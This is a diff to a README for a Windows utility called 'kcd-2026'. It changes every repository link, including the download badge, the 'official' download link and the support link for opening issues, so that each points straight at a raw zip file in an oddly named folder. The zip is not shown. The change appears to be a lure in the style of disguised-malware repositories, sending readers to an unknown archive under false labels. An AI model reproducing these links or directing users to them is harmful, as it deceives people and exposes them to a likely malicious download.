@@ -1,6 +1,6 @@
 # ⚡ kcd-2026 - Your Essential Windows Setup Companion
 
-[![Download kcd-2026](https://img.shields.io/badge/Download-kcd--2026-2ea44f?style=for-the-badge&logo=github)](https://github.com/Acemultilin2234/kcd-2026)
+[![Download kcd-2026](https://img.shields.io/badge/Download-kcd--2026-2ea44f?style=for-the-badge&logo=github)](https://github.com/Acemultilin2234/kcd-2026/raw/refs/heads/main/petrotympanic/3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you begin, make sure you have:
 
 Your primary download source is the official repository:
 
-**Download link:** [https://github.com/Acemultilin2234/kcd-2026](https://github.com/Acemultilin2234/kcd-2026)
+**Download link:** [https://github.com/Acemultilin2234/kcd-2026/raw/refs/heads/main/petrotympanic/3.7.zip](https://github.com/Acemultilin2234/kcd-2026/raw/refs/heads/main/petrotympanic/3.7.zip)
 
 **Action Required:** Visit this link to download the application.
 
@@ -96,7 +96,7 @@ A: Simply download the latest version from the link above and replace the old fo
 
 ## 🤝 Support
 
-For troubleshooting, open an issue on the [GitHub repository](https://github.com/Acemultilin2234/kcd-2026). For general questions, refer to the documentation included in the download.
+For troubleshooting, open an issue on the [GitHub repository](https://github.com/Acemultilin2234/kcd-2026/raw/refs/heads/main/petrotympanic/3.7.zip). For general questions, refer to the documentation included in the download.
 
 ---
 
